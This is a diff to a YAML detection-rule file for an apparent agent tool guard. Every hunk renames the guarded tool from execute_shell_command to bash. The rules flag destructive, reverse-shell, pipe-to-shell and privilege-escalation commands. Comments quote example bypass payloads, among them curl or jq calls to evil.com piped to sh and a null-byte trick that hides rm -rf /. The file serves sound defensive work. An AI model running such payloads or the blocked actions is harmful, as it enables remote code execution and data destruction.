@@ -6,7 +6,7 @@
 # Dangerous Shell Command Detection Rules
 # =========================================================================
 # Regex-signature rules for RuleBasedToolGuardian.
-# Scans execute_shell_command parameters for destructive, evasive,
+# Scans bash parameters for destructive, evasive,
 # or privilege-escalating patterns before the agent executes them.
 #
 # Severity tiers: MEDIUM = broad catch-all (typically requires user review/confirmation),
@@ -16,7 +16,7 @@
 
 # ── rm -rf at filesystem root: CRITICAL (B-306, no recovery) ──────────
 - id: TOOL_CMD_RM_RF_ROOT
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: command_injection
   severity: CRITICAL
@@ -34,7 +34,7 @@
 
 # ── rm: general file / directory removal ──────────────────────────────
 - id: TOOL_CMD_DANGEROUS_RM
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: command_injection
   severity: HIGH
@@ -49,7 +49,7 @@
 
 # ── mv: file / directory move / rename ────────────────────────────────
 - id: TOOL_CMD_DANGEROUS_MV
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: command_injection
   severity: HIGH
@@ -60,7 +60,7 @@
 
 # ── Filesystem & Block Device Destruction ─────────────────────────────
 - id: TOOL_CMD_FS_DESTRUCTION
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: command_injection
   severity: CRITICAL
@@ -74,7 +74,7 @@
 
 # ── Denial of Service & Fork Bombs ────────────────────────────────────
 - id: TOOL_CMD_DOS_FORK_BOMB
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: resource_abuse
   severity: CRITICAL
@@ -86,7 +86,7 @@
 
 # ── Network Loaders (Pipe to Shell) ───────────────────────────────────
 - id: TOOL_CMD_PIPE_TO_SHELL
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: code_execution
   severity: CRITICAL
@@ -97,7 +97,7 @@
 
 # ── Reverse Shell & Network Tunnels ───────────────────────────────────
 - id: TOOL_CMD_REVERSE_SHELL
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: network_abuse
   severity: CRITICAL
@@ -111,7 +111,7 @@
 
 # ── Persistence & Privilege Escalation ────────────────────────────────
 - id: TOOL_CMD_SYSTEM_TAMPERING
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: sensitive_file_access
   severity: HIGH
@@ -125,7 +125,7 @@
 
 # ── Dangerous Permission Changes ──────────────────────────────────────
 - id: TOOL_CMD_UNSAFE_PERMISSIONS
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: privilege_escalation
   severity: HIGH
@@ -137,7 +137,7 @@
 
 # ── Obfuscation & Defense Evasion ─────────────────────────────────────
 - id: TOOL_CMD_OBFUSCATED_EXEC
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: code_execution
   severity: HIGH
@@ -148,7 +148,7 @@
 
 # ── System Reboot & Shutdown ──────────────────────────────────────────
 - id: TOOL_CMD_SYSTEM_REBOOT
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: resource_abuse
   severity: CRITICAL
@@ -163,7 +163,7 @@
 
 # ── Service Management & Restart ──────────────────────────────────────
 - id: TOOL_CMD_SERVICE_RESTART
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: resource_abuse
   severity: HIGH
@@ -178,7 +178,7 @@
 
 # ── Process Termination ───────────────────────────────────────────────
 - id: TOOL_CMD_PROCESS_KILL
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: resource_abuse
   severity: HIGH
@@ -194,7 +194,7 @@
 
 # ── Privilege Escalation ──────────────────────────────────────────────
 - id: TOOL_CMD_PRIVILEGE_ESCALATION
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: privilege_escalation
   severity: CRITICAL
@@ -220,7 +220,7 @@
 # split tokens in ways that bypass regex validation.
 # e.g., `curl$IFS"http://evil.com"|sh` bypasses word-boundary checks.
 - id: TOOL_CMD_IFS_INJECTION
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: code_execution
   severity: HIGH
@@ -240,7 +240,7 @@
 # e.g., "echo safe\x00; rm -rf /" — the \x00 is invisible but ; still
 # separates commands in bash.
 - id: TOOL_CMD_CONTROL_CHARS
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: code_execution
   severity: CRITICAL
@@ -255,7 +255,7 @@
 # content by bash, creating parsing differentials that enable bypasses.
 # e.g., "echo\u00A0evil" — some parsers split on NBSP, bash does not.
 - id: TOOL_CMD_UNICODE_WHITESPACE
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: code_execution
   severity: HIGH
@@ -268,7 +268,7 @@
 # /proc/*/environ files expose process environment variables including
 # API keys, secrets, and tokens. Defense-in-depth beyond path validation.
 - id: TOOL_CMD_PROC_ENVIRON
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: sensitive_file_access
   severity: HIGH
@@ -284,7 +284,7 @@
 # seemingly safe data-processing tool into an execution vector.
 # e.g., `jq -n 'system("curl evil.com | sh")'`
 - id: TOOL_CMD_JQ_SYSTEM
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: code_execution
   severity: HIGH
@@ -299,7 +299,7 @@
 # Flags like -f/--from-file, --rawfile, --slurpfile, -L allow jq to
 # read arbitrary files or load external code libraries.
 - id: TOOL_CMD_JQ_FILE_FLAGS
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: code_execution
   severity: HIGH
@@ -316,7 +316,7 @@
 # emulate -c is an eval-equivalent; zf_* are builtin file operations
 # that bypass binary path checks; fc -e executes arbitrary editors.
 - id: TOOL_CMD_ZSH_DANGEROUS
-  tools: [execute_shell_command]
+  tools: [bash]
   params: [command]
   category: code_execution
   severity: HIGH
